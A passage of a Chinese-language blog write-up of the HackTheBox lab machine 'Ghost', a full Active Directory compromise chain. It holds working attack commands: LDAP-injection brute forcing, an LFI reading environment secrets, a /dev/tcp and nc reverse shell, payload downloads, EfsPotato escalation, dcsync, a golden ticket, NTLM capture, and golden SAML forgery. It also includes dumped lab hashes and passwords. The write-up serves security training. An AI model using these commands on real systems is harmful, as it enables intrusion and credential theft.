class="line">            <span class="string">'1_ldap-username'</span>: (<span class="keyword">None</span>, <span class="string">'gitea_temp_principal'</span>),</span><br><span class="line">            <span class="string">'1_ldap-secret'</span>: (<span class="keyword">None</span>, <span class="string">f'<span class="subst">&#123;passw&#125;</span><span class="subst">&#123;char&#125;</span>*'</span>),</span><br><span class="line">            <span class="string">'0'</span>: (<span class="keyword">None</span>, <span class="string">'[&#123;&#125;,"$K1"]'</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        res = requests.post(url, headers=headers, files=files)</span><br><span class="line">        <span class="keyword">if</span> res.status_code == <span class="number">303</span>:</span><br><span class="line">            passw += char</span><br><span class="line">            print(<span class="string">f"Passwd: <span class="subst">&#123;passw&#125;</span>"</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">print(passw)</span><br></pre></td></tr></table></figure>

<h1 id="gitea-1"><a href="#gitea-1" class="headerlink" title="gitea"></a>gitea</h1><p>得到的账号密码登录gitea：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gitea_temp_principal</span><br><span class="line">szrr8kpc3z6onlqf</span><br></pre></td></tr></table></figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024071512.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h2 id="extra-lfi"><a href="#extra-lfi" class="headerlink" title="extra lfi"></a>extra lfi</h2><p>然后查看代码发现一个函数使用接收到的extra参数拼接到目录然后读取，可能存在LFI：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024071514.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h2 id="api-key"><a href="#api-key" class="headerlink" title="api key"></a>api key</h2><p>调用需要apikey，readme中给出了public api key，并且指出DEV_INTRANET_KEY环境变量是内部API key：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024071515.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h2 id="scan-rs"><a href="#scan-rs" class="headerlink" title="scan.rs"></a>scan.rs</h2><p>另外api dev中发现scan函数直接调用bash，可能命令注入：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024071517.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h1 id="LFI"><a href="#LFI" class="headerlink" title="LFI"></a>LFI</h1><p>所以使用public api key去读环境变量：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://ghost.htb:8008/ghost/api/v3/content/posts/?extra=../../../../proc/self/environ&amp;key=a5af628828958c976a3b6cc81a</span><br><span class="line"></span><br><span class="line">DEV_INTRANET_KEY=!@yqr!X2kxmQ.@Xe</span><br></pre></td></tr></table></figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024071516.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h1 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h1><p>现在得到了dev的api key，然后就是去调用scan进行命令注入：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://intranet.ghost.htb:8008/api-dev/scan -X POST -H 'X-DEV-INTRANET-KEY: !@yqr!X2kxmQ.@Xe' -H 'Content-Type: application/json' -d '&#123;"url": "0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/10.10.14.10/4444; /bin/bash &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196"&#125;'</span><br></pre></td></tr></table></figure>

<p>得到一个容器内root：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024071518.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h2 id="docker-entrypoint-sh"><a href="#docker-entrypoint-sh" class="headerlink" title="docker-entrypoint.sh"></a>docker-entrypoint.sh</h2><p>根目录docker-entrypoint.sh发现ssh连接信息：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sshpass -p &#39;uxLmt*udNc6t3HrF&#39; ssh -o &quot;StrictHostKeyChecking no&quot; florence.ramirez@ghost.htb@dev-workstation exit</span><br></pre></td></tr></table></figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024071519.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h1 id="MSSQL-非预期"><a href="#MSSQL-非预期" class="headerlink" title="MSSQL 非预期"></a>MSSQL 非预期</h1><p>(直接mssql登录是非预期，预期补在后面)</p>
<p>上面的到的florence.ramirez账号密码可以连接mssql以及运行bloodhound收集：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 examples/mssqlclient.py florence.ramirez:'uxLmt*udNc6t3HrF'@ghost.htb -windows-auth</span><br></pre></td></tr></table></figure>

<p>只是guest，但存在linked server，OSEP style：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024071520.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<p>后面就是常规跳转，模拟用户，执行命令：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">SQL (GHOST\florence.ramirez  guest@master)&gt; enum_links</span><br><span class="line">SQL (GHOST\florence.ramirez  guest@master)&gt; use_link [PRIMARY]</span><br><span class="line">SQL &gt;[PRIMARY] (bridge_corp  bridge_corp@master)&gt; use master</span><br><span class="line">SQL &gt;[PRIMARY] (bridge_corp  bridge_corp@master)&gt; enum_impersonate</span><br><span class="line">SQL &gt;[PRIMARY] (bridge_corp  bridge_corp@master)&gt; exec_as_login sa</span><br><span class="line">SQL &gt;[PRIMARY] (sa  dbo@master)&gt; enable_xp_cmdshell</span><br><span class="line">SQL &gt;[PRIMARY] (sa  dbo@master)&gt; xp_cmdshell whoami</span><br></pre></td></tr></table></figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024071521.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h2 id="shell"><a href="#shell" class="headerlink" title="shell"></a>shell</h2><p>有杀软，简单的nc shell：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xp_cmdshell powershell -c "Invoke-WebRequest -Uri http://10.10.14.10:7777/nc.exe -OutFile $env:TEMP\nc.exe"</span><br><span class="line">xp_cmdshell %TEMP%\nc.exe -e cmd.exe 10.10.14.10 4444</span><br></pre></td></tr></table></figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024071522.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h2 id="meterpreter"><a href="#meterpreter" class="headerlink" title="meterpreter"></a>meterpreter</h2><p>然后自己做一下免杀，得到meterpreter：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># handler</span></span><br><span class="line">set AutoRunScript <span class="string">"migrate -n explorer.exe"</span></span><br><span class="line"></span><br><span class="line">wget http://<span class="number">10.10</span>.<span class="number">14.10</span>:<span class="number">7778</span>/miao.exe -O miao.exe</span><br><span class="line"><span class="built_in">start-process</span> miao.exe</span><br></pre></td></tr></table></figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024071523.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h2 id="system"><a href="#system" class="headerlink" title="system"></a>system</h2><p>然后就是常规的mssql to system，meterpreter一键getsystem后会立即掉线，但知道用的efs，自己手动执行efspotato即可：</p>
<ul>
<li>zcgonvh/EfsPotato: Exploit for EfsPotato(MS-EFSR EfsRpcOpenFileRaw with SeImpersonatePrivilege local privalege escalation vulnerability).<br><a href="https://github.com/zcgonvh/EfsPotato" target="_blank" rel="noopener">https://github.com/zcgonvh/EfsPotato</a></li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget http://10.10.14.10:7778/EfsPotato.exe -O EfsPotato.exe</span><br><span class="line"></span><br><span class="line">.\EfsPotato.exe whoami.exe</span><br><span class="line">.\EfsPotato.exe miao.exe</span><br></pre></td></tr></table></figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024071524.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024071525.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h2 id="PRIMARY-hashdump"><a href="#PRIMARY-hashdump" class="headerlink" title="PRIMARY hashdump"></a>PRIMARY hashdump</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; hashdump</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:41515af3ada195029708a53d941ab751:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:69eb46aa347a8c68edb99be2725403ab:::</span><br><span class="line">PRIMARY$:1000:aad3b435b51404eeaad3b435b51404ee:27f92da5e3d79962020ddebc08ed7d70:::</span><br><span class="line">GHOST$:1103:aad3b435b51404eeaad3b435b51404ee:dae1ad83e2af14a379017f244a2f5297::</span><br></pre></td></tr></table></figure>



<h1 id="域信任"><a href="#域信任" class="headerlink" title="域信任"></a>域信任</h1><p>现在得到的是corp.ghost.htb子域,PRIMARY就是子域DC,基础的子域到父域：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">bloodhound-python -ns <span class="number">10.10</span>.<span class="number">11.24</span> -dc dc01.ghost.htb -d ghost.htb -c All -u florence.ramirez  -p <span class="string">'uxLmt*udNc6t3HrF'</span> --zip</span><br><span class="line"></span><br><span class="line">IEX ((<span class="built_in">new-object</span> net.webclient).downloadstring(<span class="string">'http://10.10.14.10:7777/PowerView.ps1'</span>))</span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># lsadump::dcsync /all /csv</span></span><br><span class="line"><span class="number">502</span>	krbtgt	<span class="number">69</span>eb46aa347a8c68edb99be2725403ab	<span class="number">514</span></span><br><span class="line"><span class="number">1103</span>	GHOST$	dae1ad83e2af14a379017f244a2f5297	<span class="number">2080</span></span><br><span class="line"><span class="number">500</span>	Administrator	<span class="number">41515</span>af3ada195029708a53d941ab751	<span class="number">512</span></span><br><span class="line"><span class="number">1000</span>	PRIMARY$	<span class="number">27</span>f92da5e3d79962020ddebc08ed7d70	<span class="number">532480</span></span><br><span class="line"></span><br><span class="line">ghost.htb S-<span class="number">1</span>-<span class="number">5</span>-<span class="number">21</span>-<span class="number">4084500788</span>-<span class="number">938703357</span>-<span class="number">3654145966</span></span><br><span class="line">corp.ghost.htb S-<span class="number">1</span>-<span class="number">5</span>-<span class="number">21</span>-<span class="number">2034262909</span>-<span class="number">2733679486</span>-<span class="number">179904498</span></span><br><span class="line"></span><br><span class="line">python3 examples/ticketer.py -nthash dae1ad83e2af14a379017f244a2f5297 -domain-sid S-<span class="number">1</span>-<span class="number">5</span>-<span class="number">21</span>-<span class="number">2034262909</span>-<span class="number">2733679486</span>-<span class="number">179904498</span> -domain corp.ghost.htb -extra-sid S-<span class="number">1</span>-<span class="number">5</span>-<span class="number">21</span>-<span class="number">4084500788</span>-<span class="number">938703357</span>-<span class="number">3654145966</span>-<span class="number">519</span> -spn <span class="string">"krbtgt/ghost.htb"</span> Administrator</span><br><span class="line"></span><br><span class="line">export KRB5CCNAME=./Administrator.ccache</span><br><span class="line">python3 examples/getST.py -k -no-pass -debug -spn <span class="string">"CIFS/DC01.ghost.htb"</span> <span class="string">"ghost.htb/Administrator@ghost.htb"</span></span><br><span class="line"></span><br><span class="line">export KRB5CCNAME=./Administrator@ghost.htb@CIFS_DC01.ghost.htb@GHOST.HTB.ccache</span><br><span class="line">python3 examples/secretsdump.py -k -no-pass -debug Administrator@DC01.ghost.htb -dc-ip <span class="number">10.10</span>.<span class="number">11.24</span> -just-dc-ntlm</span><br></pre></td></tr></table></figure>

<ul>
<li>Trusts | The Hacker Recipes<br><a href="https://www.thehacker.recipes/ad/movement/trusts#enumeration" target="_blank" rel="noopener">https://www.thehacker.recipes/ad/movement/trusts#enumeration</a></li>
</ul>
<h1 id="预期-user"><a href="#预期-user" class="headerlink" title="预期 user"></a>预期 user</h1><p>florence.ramirez是IT组成员，前面也可以看到bitbucket.ghost.htb这个域名没有解析，但justin会去访问，所以就是加一条dns记录，获取justion的net ntlm然后破解，这部分和Intelligence类似：</p>
<ul>
<li>Intelligence - HackTheBox | 喵喵喵喵 | 某鱼唇的人类<br><a href="https://darkwing.moe/2021/07/05/Intelligence-HackTheBox/">https://darkwing.moe/2021/07/05/Intelligence-HackTheBox/</a></li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python3 dnstool.py -u GHOST\\florence.ramirez -p 'uxLmt*udNc6t3HrF' -r bitbucket.ghost.htb -a add -d 10.10.14.10 10.10.11.24</span><br><span class="line"></span><br><span class="line">sudo python3 Responder.py -i 10.10.14.10 -v</span><br><span class="line"></span><br><span class="line">justin.bradley::ghost:1122334455667788:12C3640D8F04914DAD01743B98951C0D:0101000000000000E9465C171AD7DA01DE7751958EB3EB710000000002000800450050004800540001001E00570049004E002D0030004A005600320050005300460042003200430044000400140045005000480054002E004C004F00430041004C0003003400570049004E002D0030004A005600320050005300460042003200430044002E0045005000480054002E004C004F00430041004C000500140045005000480054002E004C004F00430041004C000800300030000000000000000000000000400000F5CAC57B5107957E1FA923DACEF63DDAB22784A229532938928AF18113FD5C410A001000000000000000000000000000000000000900300048005400540050002F006200690074006200750063006B00650074002E00670068006F00730074002E006800740062000000000000000000</span><br></pre></td></tr></table></figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024071527.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024071528.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<p>然后破解出justin密码，winrm登录dc，获得user.txt:</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo hashcat -m 5600 hash.txt ~/Tools/dict/rockyou.txt</span><br><span class="line"></span><br><span class="line"><span class="meta">Qwertyuiop1234$</span><span class="bash">$</span></span><br><span class="line"></span><br><span class="line">evil-winrm -i 10.10.11.24 -u 'justin.bradley' -p 'Qwertyuiop1234$$'</span><br></pre></td></tr></table></figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024071529.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h1 id="GMSA"><a href="#GMSA" class="headerlink" title="GMSA"></a>GMSA</h1><p>然后justin去读gmsa：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">netexec ldap 10.10.11.24 -u 'justin.bradley' -p 'Qwertyuiop1234$$' --gmsa</span><br><span class="line"></span><br><span class="line">Account: adfs_gmsa$           NTLM: 4f4b81c5f6a9c1931310ece55a02a8d6</span><br></pre></td></tr></table></figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024071530.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024071531.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<p>adfs_gmsa$也可以登录：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i 10.10.11.24 -u 'adfs_gmsa$' -H 4f4b81c5f6a9c1931310ece55a02a8d6</span><br></pre></td></tr></table></figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024071532.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>



<h1 id="ADFS"><a href="#ADFS" class="headerlink" title="ADFS"></a>ADFS</h1><p>然后前面adfs web那里如果使用其他账号登录能够看到提示只允许Administrator，所以就是需要伪造管理员，基础的在adfs_gmsa$的shell中运行dump获取信息然后golden saml：</p>
<ul>
<li>Golden SAML Attack<br><a href="https://www.netwrix.com/golden_saml_attack.html" target="_blank" rel="noopener">https://www.netwrix.com/golden_saml_attack.html</a></li>
<li>mandiant/ADFSDump<br><a href="https://github.com/mandiant/ADFSDump" target="_blank" rel="noopener">https://github.com/mandiant/ADFSDump</a></li>
<li>mandiant/ADFSpoof<br><a href="https://github.com/mandiant/ADFSpoof" target="_blank" rel="noopener">https://github.com/mandiant/ADFSpoof</a></li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.\ADFSDump.exe</span><br><span class="line"><span class="meta">#</span><span class="bash"> ADFSDump会得到两个私钥，自己试一下就知道第二个才是正确的</span></span><br><span class="line"></span><br><span class="line">python ADFSpoof.py -b TKSKey.bin DKMKey.bin -s core.ghost.htb saml2 --endpoint https://core.ghost.htb:8443/adfs/saml/postResponse --nameidformat urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress --nameid Administrator@ghost.htb --rpidentifier https://core.ghost.htb:8443 --assertions '&lt;Attribute Name="http://schemas.xmlsoap.org/ws/2005/05/identity/claims/upn"&gt;&lt;AttributeValue&gt;Administrator@ghost.htb&lt;/AttributeValue&gt;&lt;/Attribute&gt;&lt;Attribute Name="http://schemas.xmlsoap.org/claims/CommonName"&gt;&lt;AttributeValue&gt;Administrator&lt;/AttributeValue&gt;&lt;/Attribute&gt;'</span><br></pre></td></tr></table></figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024071533.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024071536.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024071534.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h1 id="MSSQL"><a href="#MSSQL" class="headerlink" title="MSSQL"></a>MSSQL</h1><p>然后就和非预期那里mssql后面基本一致了，linked server</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXECUTE('EXECUTE AS LOGIN = ''sa'' EXEC SP_CONFIGURE ''show advanced options'', 1;reconfigure;EXEC SP_CONFIGURE ''xp_cmdshell'' , 1;reconfigure;exec xp_cmdshell ''whoami''') AT "PRIMARY"</span><br></pre></td></tr></table></figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024071535.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h1 id="flags"><a href="#flags" class="headerlink" title="flags"></a>flags</h1><p> 得到的Administrator hash登录：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i 10.10.11.24 -u 'Administrator' -H '1cdb17d5c14ff69e7067cffcc9e470bd'</span><br></pre></td></tr></table></figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024071526.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>



<h2 id="DC01-hashdump"><a href="#DC01-hashdump" class="headerlink" title="DC01 hashdump"></a>DC01 hashdump</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">python3 examples/secretsdump.py -k -no-pass Administrator@DC01.ghost.htb -dc-ip 10.10.11.24 -just-dc-ntlm</span><br><span class="line"></span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:1cdb17d5c14ff69e7067cffcc9e470bd:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0cdb6ae71c3824f2da2815f69485e128:::</span><br><span class="line">kathryn.holland:3602:aad3b435b51404eeaad3b435b51404ee:0adf6114ba230ef8f023eca3c0d1af50:::</span><br><span class="line">cassandra.shelton:3603:aad3b435b51404eeaad3b435b51404ee:96d2251e44e42816314c08b8e1f11b87:::</span><br><span class="line">robert.steeves:3604:aad3b435b51404eeaad3b435b51404ee:7e2e1e1163ff3fa9304ecd8df6f726fe:::</span><br><span class="line">florence.ramirez:3606:aad3b435b51404eeaad3b435b51404ee:29542931896c7e7a9fbca17b0dd8ab6a:::</span><br><span class="line">justin.bradley:3607:aad3b435b51404eeaad3b435b51404ee:a2be8ec65d6b212138cb36422ed32f46:::</span><br><span class="line">arthur.boyd:3608:aad3b435b51404eeaad3b435b51404ee:b5b7f0787f3c07f42958d33518ae19a5:::</span><br><span class="line">beth.clark:3610:aad3b435b51404eeaad3b435b51404ee:1582f51fcd02e2e5316d497f2552bb83:::</span><br><span class="line">charles.gray:3611:aad3b435b51404eeaad3b435b51404ee:d2fe7f2c7484fc550cac49836eabca3d:::</span><br><span class="line">jason.taylor:3612:aad3b435b51404eeaad3b435b51404ee:0159e6bd4326812f9a6c406ea84035e6:::</span><br><span class="line">intranet_principal:3614:aad3b435b51404eeaad3b435b51404ee:e9fac15124e1d927cbd71f851792b04f:::</span><br><span class="line">gitea_temp_principal:3615:aad3b435b51404eeaad3b435b51404ee:2058fa4502750fa5d7ebd874b1ea43a1:::</span><br><span class="line"><span class="meta">DC01$</span><span class="bash">:1000:aad3b435b51404eeaad3b435b51404ee:e6c3d61860f92e30e8e9744ac5d9783b:::</span></span><br><span class="line"><span class="meta">LINUX-DEV-WS01$</span><span class="bash">:3630:aad3b435b51404eeaad3b435b51404ee:c6ca9ac2f26669168665c4ba16981a8b:::</span></span><br><span class="line"><span class="meta">adfs_gmsa$</span><span class="bash">:4101:aad3b435b51404eeaad3b435b51404ee:4f4b81c5f6a9c1931310ece55a02a8d6:::</span></span><br><span class="line"><span class="meta">GHOST-CORP$</span><span class="bash">:2101:aad3b435b51404eeaad3b435b51404ee:ba8ef93f824c0f3b1e98037ae08ab68c:::</span></span><br></pre></td></tr></table></figure>



<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul>
<li>zcgonvh/EfsPotato: Exploit for EfsPotato(MS-EFSR EfsRpcOpenFileRaw with SeImpersonatePrivilege local privalege escalation vulnerability).<br><a href="https://github.com/zcgonvh/EfsPotato" target="_blank" rel="noopener">https://github.com/zcgonvh/EfsPotato</a></li>
<li>Trusts | The Hacker Recipes<br><a href="https://www.thehacker.recipes/ad/movement/trusts#enumeration" target="_blank" rel="noopener">https://www.thehacker.recipes/ad/movement/trusts#enumeration</a></li>
<li>Intelligence - HackTheBox | 喵喵喵喵 | 某鱼唇的人类<br><a href="https://darkwing.moe/2021/07/05/Intelligence-HackTheBox/">https://darkwing.moe/2021/07/05/Intelligence-HackTheBox/</a></li>
<li>Golden SAML Attack<br><a href="https://www.netwrix.com/golden_saml_attack.html" target="_blank" rel="noopener">https://www.netwrix.com/golden_saml_attack.html</a></li>
<li>mandiant/ADFSDump<br><a href="https://github.com/mandiant/ADFSDump" target="_blank" rel="noopener">https://github.com/mandiant/ADFSDump</a></li>
<li>mandiant/ADFSpoof<br><a href="https://github.com/mandiant/ADFSpoof" target="_blank" rel="noopener">https://github.com/mandiant/ADFSpoof</a></li>
</ul>

        </div>

        <blockquote class="post-copyright">
    
    <div class="content">
        
<span class="post-time">
    Last updated: <time datetime="2025-04-09T05:15:12.619Z" itemprop="dateUpdated">2025-04-09 13:15:12</time>
</span><br>


        
        水平不济整日被虐这也不会那也得学,脑子太蠢天天垫底这看不懂那学不会
        
    </div>
    
    <footer>
        <a href="https://darkwing.moe">
            <img src="/img/avatar.jpg" alt="暗羽">
            暗羽
        </a>
    </footer>
</blockquote>

        


        <div class="post-footer">
            
	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/HackTheBox/" rel="tag">HackTheBox</a></li></ul>


            
<div class="page-share-wrap">
    

<div class="page-share" id="pageShare">
    <ul class="reset share-icons">
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://darkwing.moe/2024/07/15/Ghost-HackTheBox/&title=《Ghost - HackTheBox》 — 喵喵喵喵&pic=https://darkwing.moe/img/avatar.jpg" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://darkwing.moe/2024/07/15/Ghost-HackTheBox/&title=《Ghost - HackTheBox》 — 喵喵喵喵&source=木を植える最も良い時期は、10年前である。次にいい時期は今である。" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      <li>
        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://darkwing.moe/2024/07/15/Ghost-HackTheBox/" data-title=" Facebook">
          <i class="icon icon-facebook"></i>
        </a>
      </li>
      <li>
        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Ghost - HackTheBox》 — 喵喵喵喵&url=https://darkwing.moe/2024/07/15/Ghost-HackTheBox/&via=https://darkwing.moe" data-title=" Twitter">
          <i class="icon icon-twitter"></i>
        </a>
      </li>
